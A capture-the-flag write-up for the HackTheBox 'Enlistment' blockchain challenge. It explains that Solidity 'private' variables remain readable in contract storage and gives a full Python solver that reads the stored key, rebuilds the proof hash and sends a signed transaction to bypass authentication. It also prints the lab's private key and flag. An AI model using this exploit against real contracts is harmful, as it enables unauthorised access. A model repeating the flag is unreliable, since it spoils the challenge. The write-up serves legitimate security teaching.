# HackTheBox Global Cyber Benchmark 2025 - Blockchain Challenge Report

## Challenge Overview

**Name:** Enlistment  
**Platform:** HackTheBox Global Cyber Benchmark 2025  
**Category:** Blockchain  
**Difficulty:** Easy  
**Status:** ✅ **Solved**  
**Objective:** Exploit smart contract storage vulnerability to bypass authentication and enlist player  
**Flag:** `HTB{gg_wp_w3lc0me_t0_th3_t34m}`

### Target Details
- **Connection Service:** `94.237.48.68:46493`
- **RPC Endpoint:** `http://94.237.48.68:48556`
- **Target Contract:** `0xFabD4DdC9d21515CEbc5bfcd1a815200b0e4651D`
- **Setup Contract:** `0x4B7D9d089f7B70024c228036E7a3490AaFdA08c1`

## Tools Used

- **Python 3.x** with Web3.py and eth-account libraries
- **netcat (nc)** for menu service interaction
- **Custom Python scripts** for automated exploitation

### Installation
```bash
pip install web3 eth-account
```

## Discovery Phase

### Initial Connection
Connected to the challenge service and obtained player credentials:
```bash
nc 94.237.48.68:46493
# Select option 1 for connection information
```

**Retrieved Information:**
- Player Private Key: `0xefcfb37078a42b498696ba6d1e16f3997218df86542bb321bf42ec8369165de1`
- Player Address: `0x7B2D662edbD8A313ebA14Ec11dd3E0DE63992c5d`
- Target Contract Address: `0xFabD4DdC9d21515CEbc5bfcd1a815200b0e4651D`

### Contract Analysis
The challenge involved two smart contracts with a critical vulnerability in data privacy assumptions.

## The Vulnerability

### Smart Contract Code
```solidity
contract Enlistment {
    bytes16 public publicKey;
    bytes16 private privateKey;  // ❌ Vulnerable: not actually private!
    mapping(address => bool) public enlisted;
    
    constructor(bytes32 _key) {
        publicKey = bytes16(_key);           // First 16 bytes
        privateKey = bytes16(_key << (16*8)); // Last 16 bytes shifted
    }

    function enlist(bytes32 _proofHash) public {
        bool authorized = _proofHash == keccak256(abi.encodePacked(publicKey, privateKey));
        require(authorized, "Invalid proof hash");
        enlisted[msg.sender] = true;
    }
}
```

### The Flaw
The vulnerability stems from a fundamental blockchain misconception:
- Variables marked `private` in Solidity only restrict contract-to-contract access
- **All blockchain data is publicly readable** regardless of visibility modifiers
- The "private" key can be read directly from storage slots

## Solution

### Step 1: Storage Exploitation
Read the contract's storage to extract the original constructor key:

```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://94.237.48.68:48556"))
storage = w3.eth.get_storage_at("0xFabD4DdC9d21515CEbc5bfcd1a815200b0e4651D", 0)
```

**Discovery:** Storage slot 0 contained the complete 32-byte original key:
```
Hex: 20204147454e5420502e202331333337454e4c4953545f52455153542062793a
String: "  AGENT P. #1337ENLIST_REQST by:"
```

### Step 2: Key Reconstruction
Applied the constructor logic to split the key correctly:

```python
# Constructor logic analysis:
# publicKey = bytes16(_key)           # First 16 bytes  
# privateKey = bytes16(_key << (16*8)) # Last 16 bytes after shift

public_key = storage[16:]   # Last 16 bytes: "ENLIST_REQST by:"
private_key = storage[:16]  # First 16 bytes: "  AGENT P. #1337"
```

### Step 3: Proof Hash Generation
```python
proof_hash = Web3.keccak(public_key + private_key)
# Result: 0x9d3f5567a25a1b5b3bc330351dcde6b026d5d22b120f52f040459d5794c48c59
```

### Step 4: Transaction Execution
```python
from eth_account import Account

account = Account.from_key("0xefcfb37078a42b498696ba6d1e16f3997218df86542bb321bf42ec8369165de1")

# Contract interaction
abi = [{"inputs": [{"type": "bytes32", "name": "_proofHash"}], 
        "name": "enlist", "outputs": [], 
        "stateMutability": "nonpayable", "type": "function"}]

contract = w3.eth.contract(address="0xFabD4DdC9d21515CEbc5bfcd1a815200b0e4651D", abi=abi)

# Send enlist transaction
tx = contract.functions.enlist(proof_hash).build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 200000,
    'gasPrice': w3.eth.gas_price
})

signed_txn = account.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
```

**Result:** Transaction successful - player enlisted in contract

### Step 5: Flag Retrieval
```bash
nc 94.237.48.68:46493
# Select option 3 to get flag
```

## Key Insights

### Technical Findings
1. **Blockchain Transparency:** All contract storage is publicly accessible via RPC calls
2. **Constructor Parameter Exposure:** Original constructor arguments preserved in storage
3. **Bit Shift Operations:** Understanding Solidity's `<< (16*8)` shift logic was crucial
4. **Hash-Based Authentication:** Common smart contract pattern vulnerable to storage analysis

### Exploitation Technique
- **Storage Reading:** Direct access via `eth_getStorageAt` bypassed visibility restrictions
- **Key Reconstruction:** Reverse-engineered constructor logic to identify public/private key split
- **Authentication Bypass:** Generated valid proof hash without cryptographic breaking

## Scripts Created

### Automated Solver
```python
#!/usr/bin/env python3
"""
HackTheBox GCB 2025 - Enlistment Challenge Solver
Exploits blockchain storage transparency vulnerability
"""

import socket
from web3 import Web3
from eth_account import Account

def solve_enlistment():
    # Connect to blockchain
    w3 = Web3(Web3.HTTPProvider("http://94.237.48.68:48556"))
    
    # Read private key from storage
    target = "0xFabD4DdC9d21515CEbc5bfcd1a815200b0e4651D"
    storage = w3.eth.get_storage_at(target, 0)
    
    # Reconstruct keys based on constructor logic
    public_key = storage[16:]  # Last 16 bytes
    private_key = storage[:16] # First 16 bytes
    
    # Generate proof hash
    proof_hash = Web3.keccak(public_key + private_key)
    
    # Execute enlist transaction
    player_key = "0xefcfb37078a42b498696ba6d1e16f3997218df86542bb321bf42ec8369165de1"
    account = Account.from_key(player_key)
    
    abi = [{"inputs": [{"type": "bytes32", "name": "_proofHash"}], 
            "name": "enlist", "outputs": [], 
            "stateMutability": "nonpayable", "type": "function"}]
    
    contract = w3.eth.contract(address=target, abi=abi)
    tx = contract.functions.enlist(proof_hash).build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 200000,
        'gasPrice': w3.eth.gas_price
    })
    
    signed = account.sign_transaction(tx)
    w3.eth.send_raw_transaction(signed.raw_transaction)
    print("✅ Player enlisted successfully!")

if __name__ == "__main__":
    solve_enlistment()
```

## Lessons Learned

1. **"Private" Variables Myth:** Solidity's `private` keyword provides no actual privacy on blockchain
2. **Storage Transparency:** All contract data is readable via direct storage access
3. **Constructor Security:** Constructor parameters are permanently stored and accessible
4. **Authentication Patterns:** Hash-based verification vulnerable when secrets are discoverable

## Final Status

**Challenge Status:** ✅ **Completed Successfully**  
**Flag Captured:** `HTB{gg_wp_w3lc0me_t0_th3_t34m}`  
**Exploitation Method:** Blockchain storage analysis and key reconstruction  

### Success Metrics
- ✅ Vulnerability identified in smart contract storage assumptions
- ✅ Original constructor key successfully extracted
- ✅ Authentication bypass achieved through proof hash generation
- ✅ Player successfully enlisted in target contract
- ✅ Flag retrieved from challenge service

This blockchain challenge effectively demonstrated fundamental misconceptions about data privacy in smart contracts and the importance of understanding blockchain transparency when designing authentication mechanisms.